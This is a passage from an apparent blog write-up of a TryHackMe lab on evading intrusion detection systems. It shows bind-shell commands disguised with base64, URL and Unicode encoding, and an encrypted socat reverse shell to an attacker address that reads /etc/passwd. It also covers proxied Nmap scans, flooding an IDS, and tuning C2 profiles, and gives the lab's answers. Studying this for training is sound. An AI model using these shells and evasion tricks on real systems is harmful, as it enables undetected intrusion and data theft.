</code></pre></div> <p><code>ncat -lvnp 1234 -e /bin/bash</code> is encoded to <code>bmNhdCAtbHZucCAxMjM0IC1lIC9iaW4vYmFzaA==</code>.</p> <h3 id=url-encoding><strong>URL Encoding</strong><a class=headerlink href=#url-encoding title="Permanent link">&para;</a></h3> <p>URL encoding converts certain characters to the form %HH, where HH is the hexadecimal ASCII representation. English letters, period, dash, and underscore are not affected. You can refer to <a href=https://datatracker.ietf.org/doc/html/rfc3986#section-2.4>section 2.4 in RFC 3986</a> for more information.</p> <p>One utility that you can easily install on your <abbr title="Linux is a command line operating system based on unix. There are multiple operating systems that are based on Linux.">Linux</abbr> system is <code>urlencode</code>; alternatively, you can either use an online service or search for similar utilities on MS Windows and macOS. To follow along on the AttackBox, you can install <code>urlencode</code> by running the command <code>apt install gridsite-clients</code>.</p> <div class=highlight><span class=filename>Pentester Terminal</span><pre><span></span><code><a id=__codelineno-2-1 name=__codelineno-2-1 href=#__codelineno-2-1></a><span class=n>pentester</span><span class=nv>@TryHackMe</span><span class=p>$</span> <span class=n>urlencode</span> <span class=n>ncat</span> <span class=n>-lvnp</span> <span class=n>1234</span> <span class=n>-e</span> <span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>bash</span>
<a id=__codelineno-2-2 name=__codelineno-2-2 href=#__codelineno-2-2></a><span class=n>ncat</span><span class=k>%</span><span class=n>20-lvnp</span><span class=k>%</span><span class=n>201234</span><span class=k>%</span><span class=n>20-e</span><span class=k>%</span><span class=n>20</span><span class=k>%</span><span class=n>2Fbin</span><span class=k>%</span><span class=n>2Fbash</span>
</code></pre></div> <p><code>ncat -lvnp 1234 -e /bin/bash</code> becomes <code>ncat%20-lvnp%201234%20-e%20%2Fbin%2Fbash</code> after URL encoding. Depending what the <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr>/IPS signature is matching, URL encoding might help evade detection.</p> <h3 id=use-escaped-unicode><strong>Use Escaped Unicode</strong><a class=headerlink href=#use-escaped-unicode title="Permanent link">&para;</a></h3> <p>Some applications will still process your input and execute it properly if you use escaped Unicode. There are multiple ways to use escaped Unicode depending on the system processing the input string. For example, you can use <a href=https://icyberchef.com/ >CyberChef</a> to select and configure the Escape Unicode Characters recipe as shown in the image below.</p> <ol> <li>Search for Escape Unicode Characters</li> <li>Drag it to the Recipe column</li> <li>Ensure you a check-mark near Encode all chars with a prefix of <code>\u</code></li> <li>Ensure you have a check-mark near Uppercase hex with a padding of 4</li> </ol> <p> <figure><img src=image-12.png><figcaption>Alt text</figcaption> </figure> </p> <p>If you use the format <code>\uXXXX</code>, then <code>ncat -lvnp 1234 -e /bin/bash</code> becomes <code>\u006e\u0063\u0061\u0074\u0020\u002d\u006c\u0076\u006e\u0070\u0020\u0031\u0032\u0033\u0034\u0020\u002d\u0065\u0020\u002f\u0062\u0069\u006e\u002f\u0062\u0061\u0073\u0068</code>. It is clearly a drastic transformation that would help you evade detection, assuming the target system will interpret it correctly and execute it.</p> <h3 id=encrypt-the-communication-channel><strong>Encrypt the Communication Channel</strong><a class=headerlink href=#encrypt-the-communication-channel title="Permanent link">&para;</a></h3> <p>Because an <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr>/IPS won’t inspect encrypted data, an attacker can take advantage of encryption to evade detection. Unlike encoding, encryption requires an encryption key.</p> <p>One direct approach is to create the necessary encryption key on the attacker’s system and set <code>socat</code> to use the encryption key to enforce encryption as it listens for incoming connections. An encrypted reverse shell can be carried out in three steps:</p> <ol> <li>Create the key</li> <li>Listen on the attacker’s machine</li> <li>Connect to the attacker’s machine</li> </ol> <p><strong>Firstly</strong>, On the AttackBox or any <abbr title="Linux is a command line operating system based on unix. There are multiple operating systems that are based on Linux.">Linux</abbr> system, we can create the key using <code>openssl</code>.</p> <p><code>openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt</code></p> <p>The arguments in the above command are:</p> <ul> <li><code>req</code> indicates that this is a certificate signing request. Obviously, we won’t submit our certificate for signing.</li> <li><code>-x509</code> specifies that we want an X.509 certificate</li> <li><code>-newkey rsa:4096</code> creates a new certificate request and a new private key using RSA, with the key size being 4096 bits. (You can use other options for RSA key size, such as <code>-newkey rsa:2048</code>.)</li> <li><code>-days 365</code> shows that the validity of our certificate will be one year</li> <li><code>-subj</code> sets data, such as organization and country, via the command-line.</li> <li><code>-nodes</code> simplifies our command and does not encrypt the private key</li> <li><code>-keyout PRIVATE_KEY</code> specifies the filename where we want to save our private key</li> <li><code>-out CERTIFICATE</code> specifies the filename to which we want to write the certificate request</li> </ul> <p>The above command returns:</p> <ul> <li>Private key: <code>thm-reverse.key</code></li> <li>Certificate: <code>thm-reverse.crt</code></li> </ul> <p>The Privacy Enhanced Mail (PEM) <code>.pem</code> file requires the concatenation of the private key <code>.key</code> and the certificate <code>.crt</code> files. We can use <code>cat</code> to create our PEM file from the two files that we have just created:</p> <p><code>cat thm-reverse.key thm-reverse.crt &gt; thm-reverse.pem</code>.</p> <p><strong>Secondly</strong>, with the PEM file ready, we can start listening while using the key for encrypting the communication with the client.</p> <p><code>socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT</code></p> <p>If you are not familiar with <code>socat</code>, the options that we used are:</p> <ul> <li><code>-d -d</code> provides some debugging data (fatal, error, warning, and notice messages)</li> <li><code>OPENSSL-LISTEN:PORT_NUM</code> indicates that the connection will be encrypted using OPENSSL</li> <li><code>cert=PEM_FILE</code> provides the PEM file (certificate and private key) to establish the encrypted connection</li> <li><code>verify=0</code> disables checking peer’s certificate</li> <li><code>fork</code> creates a sub-process to handle each new connection.</li> </ul> <p><strong>Thirdly</strong>, on the victim system, <code>socat OPENSSL:10.20.30.1:4443,verify=0 EXEC:/bin/bash</code>. Note that the <code>EXEC</code> invokes the specified program.</p> <p>Let’s demonstrate this. On the attacker system, we carried out the following:</p> <div class=highlight><span class=filename>Pentester Terminal</span><pre><span></span><code><a id=__codelineno-3-1 name=__codelineno-3-1 href=#__codelineno-3-1></a><span class=n>pentester</span><span class=nv>@TryHackMe</span><span class=p>$</span> <span class=n>openssl</span> <span class=n>req</span> <span class=n>-x509</span> <span class=n>-newkey</span> <span class=n>rsa</span><span class=p>:</span><span class=n>4096</span> <span class=n>-days</span> <span class=n>365</span> <span class=n>-subj</span> <span class=s1>&#39;/CN=www.redteam.thm/O=Red Team THM/C=UK&#39;</span> <span class=n>-nodes</span> <span class=n>-keyout</span> <span class=n>thm-reverse</span><span class=p>.</span><span class=n>key</span> <span class=n>-out</span> <span class=n>thm-reverse</span><span class=p>.</span><span class=n>crt</span>
<a id=__codelineno-3-2 name=__codelineno-3-2 href=#__codelineno-3-2></a><span class=n>Generating</span> <span class=n>a</span> <span class=n>RSA</span> <span class=n>private</span> <span class=n>key</span>
<a id=__codelineno-3-3 name=__codelineno-3-3 href=#__codelineno-3-3></a><span class=p>........................++++</span>
<a id=__codelineno-3-4 name=__codelineno-3-4 href=#__codelineno-3-4></a><span class=p>......++++</span>
<a id=__codelineno-3-5 name=__codelineno-3-5 href=#__codelineno-3-5></a><span class=n>writing</span> <span class=n>new</span> <span class=n>private</span> <span class=n>key</span> <span class=n>to</span> <span class=s1>&#39;thm-reverse.key&#39;</span>
<a id=__codelineno-3-6 name=__codelineno-3-6 href=#__codelineno-3-6></a><span class=p>-----</span>
<a id=__codelineno-3-7 name=__codelineno-3-7 href=#__codelineno-3-7></a><span class=n>pentester</span><span class=nv>@TryHackMe</span><span class=p>$</span> <span class=nb>ls</span>
<a id=__codelineno-3-8 name=__codelineno-3-8 href=#__codelineno-3-8></a><span class=n>thm-reverse</span><span class=p>.</span><span class=n>crt</span>  <span class=n>thm-reverse</span><span class=p>.</span><span class=n>key</span>
<a id=__codelineno-3-9 name=__codelineno-3-9 href=#__codelineno-3-9></a><span class=n>pentester</span><span class=nv>@TryHackMe</span><span class=p>$</span> <span class=nb>cat </span><span class=n>thm-reverse</span><span class=p>.</span><span class=n>key</span> <span class=n>thm-reverse</span><span class=p>.</span><span class=n>crt</span> <span class=p>&gt;</span> <span class=n>thm-reverse</span><span class=p>.</span><span class=n>pem</span>
<a id=__codelineno-3-10 name=__codelineno-3-10 href=#__codelineno-3-10></a><span class=n>pentester</span><span class=nv>@TryHackMe</span><span class=p>$</span> <span class=n>socat</span> <span class=n>-d</span> <span class=n>-d</span> <span class=n>OPENSSL-LISTEN</span><span class=p>:</span><span class=n>4443</span><span class=p>,</span><span class=n>cert</span><span class=p>=</span><span class=n>thm-reverse</span><span class=p>.</span><span class=n>pem</span><span class=p>,</span><span class=n>verify</span><span class=p>=</span><span class=n>0</span><span class=p>,</span><span class=n>fork</span> <span class=n>STDOUT</span>
<a id=__codelineno-3-11 name=__codelineno-3-11 href=#__codelineno-3-11></a><span class=n>2022</span><span class=p>/</span><span class=n>02</span><span class=p>/</span><span class=n>24</span> <span class=n>13</span><span class=p>:</span><span class=n>39</span><span class=p>:</span><span class=n>07</span> <span class=n>socat</span><span class=p>[</span><span class=n>1208</span><span class=p>]</span> <span class=n>W</span> <span class=n>ioctl</span><span class=p>(</span><span class=n>6</span><span class=p>,</span> <span class=n>IOCTL_VM_SOCKETS_GET_LOCAL_CID</span><span class=p>,</span> <span class=p>...):</span> <span class=n>Inappropriate</span> <span class=n>ioctl</span> <span class=k>for</span> <span class=n>device</span>
<a id=__codelineno-3-12 name=__codelineno-3-12 href=#__codelineno-3-12></a><span class=n>2022</span><span class=p>/</span><span class=n>02</span><span class=p>/</span><span class=n>24</span> <span class=n>13</span><span class=p>:</span><span class=n>39</span><span class=p>:</span><span class=n>07</span> <span class=n>socat</span><span class=p>[</span><span class=n>1208</span><span class=p>]</span> <span class=n>N</span> <span class=n>listening</span> <span class=n>on</span> <span class=n>AF</span><span class=p>=</span><span class=n>2</span> <span class=n>0</span><span class=p>.</span><span class=n>0</span><span class=p>.</span><span class=n>0</span><span class=p>.</span><span class=n>0</span><span class=p>:</span><span class=n>4443</span>
</code></pre></div> <p>As we have a listener on the attacker system, we switched to the victim machine, and we executed the following:</p> <div class=highlight><span class=filename>Target Terminal</span><pre><span></span><code><a id=__codelineno-4-1 name=__codelineno-4-1 href=#__codelineno-4-1></a><span class=n>pentester</span><span class=nv>@target</span><span class=p>$</span> <span class=n>socat</span> <span class=n>OPENSSL</span><span class=p>:</span><span class=n>10</span><span class=p>.</span><span class=n>20</span><span class=p>.</span><span class=n>30</span><span class=p>.</span><span class=n>129</span><span class=p>:</span><span class=n>4443</span><span class=p>,</span><span class=n>verify</span><span class=p>=</span><span class=n>0</span> <span class=n>EXEC</span><span class=p>:/</span><span class=n>bin</span><span class=p>/</span><span class=n>bash</span>
</code></pre></div> <p>Back to the attacker system, let’s run <code>cat /etc/passwd</code>:</p> <div class=highlight><span class=filename>Pentester Terminal</span><pre><span></span><code><a id=__codelineno-5-1 name=__codelineno-5-1 href=#__codelineno-5-1></a><span class=n>pentester</span><span class=nv>@TryHackMe</span><span class=p>$</span> <span class=n>socat</span> <span class=n>-d</span> <span class=n>-d</span> <span class=n>OPENSSL-LISTEN</span><span class=p>:</span><span class=n>4443</span><span class=p>,</span><span class=n>cert</span><span class=p>=</span><span class=n>thm-reverse</span><span class=p>.</span><span class=n>pem</span><span class=p>,</span><span class=n>verify</span><span class=p>=</span><span class=n>0</span><span class=p>,</span><span class=n>fork</span> <span class=n>STDOUT</span>
<a id=__codelineno-5-2 name=__codelineno-5-2 href=#__codelineno-5-2></a><span class=p>[...]</span>
<a id=__codelineno-5-3 name=__codelineno-5-3 href=#__codelineno-5-3></a><span class=n>2022</span><span class=p>/</span><span class=n>02</span><span class=p>/</span><span class=n>24</span> <span class=n>15</span><span class=p>:</span><span class=n>54</span><span class=p>:</span><span class=n>28</span> <span class=n>socat</span><span class=p>[</span><span class=n>7620</span><span class=p>]</span> <span class=n>N</span> <span class=n>starting</span> <span class=n>data</span> <span class=n>transfer</span> <span class=n>loop</span> <span class=n>with</span> <span class=n>FDs</span> <span class=p>[</span><span class=n>7</span><span class=p>,</span><span class=n>7</span><span class=p>]</span> <span class=n>and</span> <span class=p>[</span><span class=n>1</span><span class=p>,</span><span class=n>1</span><span class=p>]</span>
<a id=__codelineno-5-4 name=__codelineno-5-4 href=#__codelineno-5-4></a>
<a id=__codelineno-5-5 name=__codelineno-5-5 href=#__codelineno-5-5></a><span class=nb>cat </span><span class=p>/</span><span class=n>etc</span><span class=p>/</span><span class=n>passwd</span>
<a id=__codelineno-5-6 name=__codelineno-5-6 href=#__codelineno-5-6></a><span class=n>root</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=n>0</span><span class=p>:</span><span class=n>0</span><span class=p>:</span><span class=n>root</span><span class=p>:/</span><span class=n>root</span><span class=p>:/</span><span class=n>bin</span><span class=p>/</span><span class=n>bash</span>
<a id=__codelineno-5-7 name=__codelineno-5-7 href=#__codelineno-5-7></a><span class=n>bin</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=n>1</span><span class=p>:</span><span class=n>1</span><span class=p>:</span><span class=n>bin</span><span class=p>:/</span><span class=n>bin</span><span class=p>:/</span><span class=n>sbin</span><span class=p>/</span><span class=n>nologin</span>
<a id=__codelineno-5-8 name=__codelineno-5-8 href=#__codelineno-5-8></a><span class=p>[...]</span>
</code></pre></div> <p>However, if the <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr>/IPS inspects the traffic, all the packet data will be encrypted. In other words, the IPS will be completely oblivious to exchange traffic and commands such as <code>cat /etc/passwd</code>. The screenshot below shows how things appear on the wire when captured using Wireshark. The highlighted packet contains <code>cat /etc/passwd</code>; however, it is encrypted.</p> <p><img alt src=image-13.png></p> <p>As you can tell, it is not possible to make sense of the commands or data being exchanged. To better see the value of the added layer of encryption, we will compare this with an equivalent <code>socat</code> connection that does not use encryption.</p> <ol> <li>On the attacker’s system, we run <code>socat -d -d TCP-LISTEN:4443,fork STDOUT</code>.</li> <li>On the victim’s machine, we run <code>socat TCP:10.20.30.129:4443 EXEC:/bin/bash</code>.</li> <li>Back on the attacker’s system, we type <code>cat /etc/passwd</code> and hit Enter/Return.</li> </ol> <p>Because no encryption was used, capturing the traffic exchanged between the two systems will expose the commands, and the traffic exchanged. In the following screenshot, we can see the command sent by the attacker.</p> <p><img alt src=image-14.png></p> <p>Furthermore, it is a trivial task to follow the <abbr title="Transmission Control Protocol (TCP) is a connection-oriented protocol requiring a TCP three-way-handshake to establish a connection. TCP provides reliable data transfer, flow control and congestion control. Higher-level protocols such as HTTP, POP3, IMAP and SMTP use TCP.">TCP</abbr> stream as it is in cleartext and learn everything exchanged between the attacker and the target system. The screenshot below uses the “Follow <abbr title="Transmission Control Protocol (TCP) is a connection-oriented protocol requiring a TCP three-way-handshake to establish a connection. TCP provides reliable data transfer, flow control and congestion control. Higher-level protocols such as HTTP, POP3, IMAP and SMTP use TCP.">TCP</abbr> Stream” option from Wireshark.</p> <p><img alt src=image-15.png></p> <h3 id=modify-the-data><strong>Modify the data</strong><a class=headerlink href=#modify-the-data title="Permanent link">&para;</a></h3> <p>Consider the simple case where you want to use Ncat to create a bind shell. The following command <code>ncat -lvnp 1234 -e /bin/bash</code> tells <code>ncat</code> to listen on <abbr title="Transmission Control Protocol (TCP) is a connection-oriented protocol requiring a TCP three-way-handshake to establish a connection. TCP provides reliable data transfer, flow control and congestion control. Higher-level protocols such as HTTP, POP3, IMAP and SMTP use TCP.">TCP</abbr> port 1234 and bind Bash shell to it. If you want to detect packets containing such commands, you need to think of something specific to match the signature but not too specific.</p> <p>Scanning for <code>ncat -lvnp</code> can be easily evaded by changing the order of the flags. On the other hand, inspecting the payload for <code>ncat -</code> can be evaded by adding an extra white space, such as <code>ncat -</code> which would still run correctly on the target system. If the <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr> is looking for <code>ncat</code>, then simple changes to the original command won’t evade detection. We need to consider more sophisticated approaches depending on the target system/application. One option would be to use a different command such as <code>nc</code> or <code>socat</code>. Alternatively, you can consider a different encoding if the target system can process it properly.</p> <details class=question> <summary>Answer the questions bellow</summary> <p>Question: Using <code>base64</code> encoding, what is the transformation of <code>cat /etc/passwd</code>?</p> <blockquote> <p>Ans: Y2F0IC9ldGMvcGFzc3dkCg==</p> </blockquote> <p>Question: The <code>base32</code> encoding of a particular string is <code>NZRWC5BAFVWCAOBQHAYAU===</code>. What is the original string?</p> <blockquote> <p>Ans: ncat -l 8080 <img alt src=image-16.png></p> </blockquote> <p>Question: Using the provided <code>openssl</code> command above. You created a certificate, which we gave the extension <code>.crt</code>, and a private key, which we gave the extension <code>.key</code>. What is the first line in the certificate file?</p> <blockquote> <p>Ans: -----BEGIN CERTIFICATE-----</p> </blockquote> <p>Question: What is the last line in the private key file?</p> <blockquote> <p>Ans: -----END PRIVATE KEY-----</p> </blockquote> <p>Question: On the attached machine from the previous task, browse to <code>http://MACHINE_IP:8080</code>, where you can write your <abbr title="Linux is a command line operating system based on unix. There are multiple operating systems that are based on Linux.">Linux</abbr> commands. Note that no output will be returned. A command like <code>ncat -lvnp 1234 -e /bin/bash</code> will create a bind shell that you can connect to it from the AttackBox using <code>ncat MACHINE_IP 1234</code>; however, some IPS is filtering out the command we are submitting on the form. Using one of the techniques mentioned in this task, try to adapt the command typed in the form to run properly. Once you connect to the bind shell using <code>ncat MACHINE_IP 1234</code>, find the user’s name.</p> <blockquote> <p>Ans: redteamnetsec</p> </blockquote> </details> <h2 id=task-6-evasion-via-route-manipulation><strong>Task 6: Evasion via Route Manipulation</strong><a class=headerlink href=#task-6-evasion-via-route-manipulation title="Permanent link">&para;</a></h2> <p>Evasion via route manipulation includes:</p> <ul> <li>Relying on source routing</li> <li>Using proxy servers</li> </ul> <p><img alt src=image-17.png></p> <h3 id=relying-on-source-routing><strong>Relying on Source Routing</strong><a class=headerlink href=#relying-on-source-routing title="Permanent link">&para;</a></h3> <p>In many cases, you can use source routing to force the packets to use a certain route to reach their destination. <abbr title="Nmap (Network Mapper) is a open-source tool used for network discovery and security auditing. It also assists in the exploration of network hosts and services, providing information about open ports, operating systems, and other details.">Nmap</abbr> provides this feature using the option <code>--ip-options</code>. <abbr title="Nmap (Network Mapper) is a open-source tool used for network discovery and security auditing. It also assists in the exploration of network hosts and services, providing information about open ports, operating systems, and other details.">Nmap</abbr> offers loose and strict routing:</p> <ul> <li>Loose routing can be specified using <code>L</code>. For instance, <code>--ip-options "L 10.10.10.50 10.10.50.250"</code> requests that your scan packets are routed through the two provided IP addresses.</li> <li>Strict routing can be specified using <code>S</code>. Strict routing requires you to set every hop between your system and the target host. For instance, <code>--ip-options "S 10.10.10.1 10.10.20.2 10.10.30.3"</code> specifies that the packets go via these three hops before reaching the target host.</li> </ul> <h3 id=using-proxy-servers><strong>Using <abbr title="A proxy server is a system or router that provides a gateway between users and the internet. Therefore, it helps prevent cyber attackers from entering a private network. It is a server, referred to as an “intermediary” because it goes between end-users and the web pages they visit online.">Proxy</abbr> Servers</strong><a class=headerlink href=#using-proxy-servers title="Permanent link">&para;</a></h3> <p>The use of proxy servers can help hide your source. <abbr title="Nmap (Network Mapper) is a open-source tool used for network discovery and security auditing. It also assists in the exploration of network hosts and services, providing information about open ports, operating systems, and other details.">Nmap</abbr> offers the option <code>--proxies</code> that takes a list of a comma-separated list of proxy URLs. Each URL should be expressed in the format <code>proto://host:port</code>. Valid protocols are <abbr title="Hypertext Transfer Protocol (HTTP) is the protocol that specifies how a web browser and a web server communicate. Your web browser requests content from the TryHackMe web server using the HTTP protocol as you go through this room.">HTTP</abbr> and SOCKS4; moreover, authentication is not currently supported.</p> <p>Consider the following example. Instead of running <code>nmap -sS MACHINE_IP</code>, you would edit your <abbr title="Nmap (Network Mapper) is a open-source tool used for network discovery and security auditing. It also assists in the exploration of network hosts and services, providing information about open ports, operating systems, and other details.">Nmap</abbr> command to something like <code>nmap -sS HTTP://PROXY_HOST1:8080,SOCKS4://PROXY_HOST2:4153 MACHINE_IP</code>. This way, you would make your scan go through <abbr title="Hypertext Transfer Protocol (HTTP) is the protocol that specifies how a web browser and a web server communicate. Your web browser requests content from the TryHackMe web server using the HTTP protocol as you go through this room.">HTTP</abbr> proxy host1, then SOCKS4 proxy host2, before reaching your target. It is important to note that finding a reliable proxy requires some trial and error before you can rely on it to hide your <abbr title="Nmap (Network Mapper) is a open-source tool used for network discovery and security auditing. It also assists in the exploration of network hosts and services, providing information about open ports, operating systems, and other details.">Nmap</abbr> scan source.</p> <p>If you use your web browser to connect to the target, it would be a simple task to pass your traffic via a proxy server. Other network tools usually provide their own proxy settings that you can use to hide your traffic source.</p> <details class=question> <summary>Answer the questions bellow</summary> <p>Question: Protocols used in proxy servers can be <abbr title="Hypertext Transfer Protocol (HTTP) is the protocol that specifies how a web browser and a web server communicate. Your web browser requests content from the TryHackMe web server using the HTTP protocol as you go through this room.">HTTP</abbr>, HTTPS, SOCKS4, and SOCKS5. Which protocols are currently supported by <abbr title="Nmap (Network Mapper) is a open-source tool used for network discovery and security auditing. It also assists in the exploration of network hosts and services, providing information about open ports, operating systems, and other details.">Nmap</abbr>?</p> <blockquote> <p>Ans: <abbr title="Hypertext Transfer Protocol (HTTP) is the protocol that specifies how a web browser and a web server communicate. Your web browser requests content from the TryHackMe web server using the HTTP protocol as you go through this room.">HTTP</abbr> SOCKS4</p> </blockquote> </details> <h2 id=task-7-evasion-via-tactical-dos><strong>Task 7: Evasion via Tactical <abbr title="Denial of Service (DoS) is an attack on the target's availability to make the target service/system unavailable to legitimate users.">DoS</abbr></strong><a class=headerlink href=#task-7-evasion-via-tactical-dos title="Permanent link">&para;</a></h2> <p>Evasion via tactical <abbr title="Denial of Service (DoS) is an attack on the target's availability to make the target service/system unavailable to legitimate users.">DoS</abbr> includes:</p> <ul> <li>Launching denial of service against the <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr>/IPS</li> <li>Launching denial of Service against the logging server</li> </ul> <p><img alt src=image-18.png></p> <p>An <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr>/IPS requires a high processing power as the number of rules grows and the network traffic volume increases. Moreover, especially in the case of <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr>, the primary response is logging traffic information matching the signature. Consequently, you might find it beneficial if you can:</p> <ul> <li>Create a huge amount of benign traffic that would simply overload the processing capacity of the <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr>/IPS.</li> <li>Create a massive amount of not-malicious traffic that would still make it to the logs. This action would congest the communication channel with the logging server or exceed its disk writing capacity.</li> </ul> <p>It is also worth noting that the target of your attack can be the <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr> operator. By causing a vast number of false positives, you can cause operator fatigue against your “adversary.”</p> <details class=question> <summary>Answer the questions bellow</summary> <p>Question: Make sure you have read and understood the three points of this task.</p> <blockquote> <p>Ans: No answer needed</p> </blockquote> </details> <h2 id=task-8-c2-and-idsips-evasion><strong>Task 8: C2 and <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr>/IPS Evasion</strong><a class=headerlink href=#task-8-c2-and-idsips-evasion title="Permanent link">&para;</a></h2> <p>Pentesting frameworks, such as Cobalt Strike and Empire, offer malleable Command and Control (C2) profiles. These profiles allow various fine-tuning to evade <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr>/IPS systems. If you are using such a framework, it is worth creating a custom profile instead of relying on a default one. Examples variables you can control include the following:</p> <ul> <li><strong>User-Agent</strong>: The tool or framework you are using can expose you via its default-set user-agent. Hence, it is always important to set the user-agent to something innocuous and test to confirm your settings.</li> <li><strong>Sleep Time</strong>: The sleep time allows you to control the callback interval between beacon check-ins. In other words, you can control how often the infected system will attempt to connect to the control system.</li> <li><strong>Jitter</strong>: This variable lets you add some randomness to the sleep time, specified by the jitter percentage. A jitter of 30% results in a sleep time of ±30% to further evade detection.</li> <li><strong>SSL Certificate</strong>: Using your authentic-looking SSL certificate will significantly improve your chances of evading detection. It is a very worthy investment of time.</li> <li><strong>DNS Beacon</strong>: Consider the case where you are using DNS protocol to exfiltrate data. You can fine-tune DNS beacons by setting the DNS servers and the hostname in the DNS query. The hostname will be holding the exfiltrated data.</li> </ul> <p><img alt src=image-19.png></p> <p>This <a href=https://github.com/bigb0sss/RedTeam-OffensiveSecurity/blob/master/01-CobaltStrike/malleable_C2_profile/CS4.0_guideline.profile>CobaltStrike Guideline Profile</a> shows how a profile is put together.</p> <details class=question> <summary>Answer the questions bellow</summary> <p>Question: Which variable would you modify to add a random sleep time between beacon check-ins?</p> <blockquote> <p>Ans: Jitter</p> </blockquote> </details> <h2 id=task-9-next-gen-security><strong>Task 9: Next-Gen Security</strong><a class=headerlink href=#task-9-next-gen-security title="Permanent link">&para;</a></h2> <p>Next-Generation Network IPS (NGNIPS) has the following five characteristics according to Gartner:</p> <ol> <li>Standard first-generation IPS capabilities: A next-generation network IPS should achieve what a traditional network IPS can do.</li> <li>Application awareness and full-stack visibility: Identify traffic from various applications and enforce the network security policy. An NGNIPS must be able to understand up to the application layer.</li> <li>Context-awareness: Use information from sources outside of the IPS to aid in blocking decisions.</li> <li>Content awareness: Able to inspect and classify files, such as executable programs and documents, in inbound and outbound traffic.</li> <li>Agile engine: Support upgrade paths to benefit from new information feeds.</li> </ol> <p>Because a Next-Generation <abbr title="A security tool, hardware or software that is used to filter network traffic by stopping unauthorized incoming and outgoing traffic.">Firewall</abbr> (NGFW) provides the same functionality as an IPS, it seems that the term NGNIPS is losing popularity for the sake of NGFW. You can read more about NGFW in the <a href=../redteamfirewalls/ >Red Team Firewalls</a> room.</p> <h2 id=task-10-summary><strong>Task 10: Summary</strong><a class=headerlink href=#task-10-summary title="Permanent link">&para;</a></h2> <p>In this room, we covered <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr> and IPS types based on installation location and detection engine. We also considered Snort 2 rules as an example of how <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr> rules are triggered. To evade detection, one needs to gather as much information as possible about the deployed devices and experiment with different techniques. In other words, trial and error might be inevitable unless one has complete knowledge of the security devices and their configuration.</p> <p>Using Command and Control (C2) frameworks provides their contribution to IPS evasion via controlling the shape of the traffic to make it as innocuous as it can get. C2 profiles are a critical feature that one should learn to master if they use any C2 framework that supports malleable profiles.</p> <hr> <div class=md-source-file> <small> Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">September 16, 2023</span> <br> Created: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">September 16, 2023</span> </small> </div> <!-- Giscus --> <h2 id=__comments>Comments</h2> <!-- Replace with generated snippet --> <script src=https://giscus.app/client.js data-repo=hieuhdh/hieuhdh.github.io data-repo-id=R_kgDOHowGCg data-category=General data-category-id=DIC_kwDOHowGCs4CQLlU data-mapping=pathname data-reactions-enabled=1 data-emit-metadata=0 data-input-position=bottom data-theme=preferred_color_scheme data-lang=vi crossorigin=anonymous async>
  </script> <!-- Synchronize Giscus theme with palette --> <script>
    var giscus = document.querySelector("script[src*=giscus]")

    /* Set palette on initial load */
    var palette = __md_get("__palette")
    if (palette && typeof palette.color === "object") {
      var theme = palette.color.scheme === "slate" ? "dark" : "light"
      giscus.setAttribute("data-theme", theme) 
    }

    /* Register event handlers after documented loaded */
    document.addEventListener("DOMContentLoaded", function() {
      var ref = document.querySelector("[data-md-component=palette]")
      ref.addEventListener("change", function() {
        var palette = __md_get("__palette")
        if (palette && typeof palette.color === "object") {
          var theme = palette.color.scheme === "slate" ? "dark" : "light"

          /* Instruct Giscus to change theme */
          var frame = document.querySelector(".giscus-frame")
          frame.contentWindow.postMessage(
            { giscus: { setConfig: { theme } } },
            "https://giscus.app"
          )
        }
      })
    })
